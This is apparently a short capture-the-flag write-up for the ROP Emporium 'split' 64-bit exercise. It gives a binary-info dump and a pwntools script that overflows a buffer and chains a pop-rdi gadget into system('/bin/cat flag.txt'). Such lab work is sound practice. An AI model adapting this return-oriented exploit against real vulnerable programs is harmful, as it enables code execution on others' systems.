# split  64 bit

---

```bash
❯ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> hy....
Thank you!

Exiting
```

---

Basic file check:

```bash
❯ rabin2 -I split
arch     x86
baddr    0x400000
binsz    6805
bintype  elf
bits     64
canary   false
injprot  false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

---


Exploit....

```python
from pwn import *

context.binary = binary = "./split"
							
# payload = b'A' * 40 + pop_rdi + p64(0x00000000004007c3) + "/bin/cat flag.txt" + p64(0x00601060) + Any address of pwnme - p64(0x0000000000400741) + system - p64(0x0000000000400560)
payload = b'A' * 40 + p64(0x00000000004007c3) + p64(0x601060) + p64(0x0000000000400741) + p64(0x0000000000400560)
0x601060


p = process()

p.sendlineafter(b'>', payload)

p.interactive()
```

---

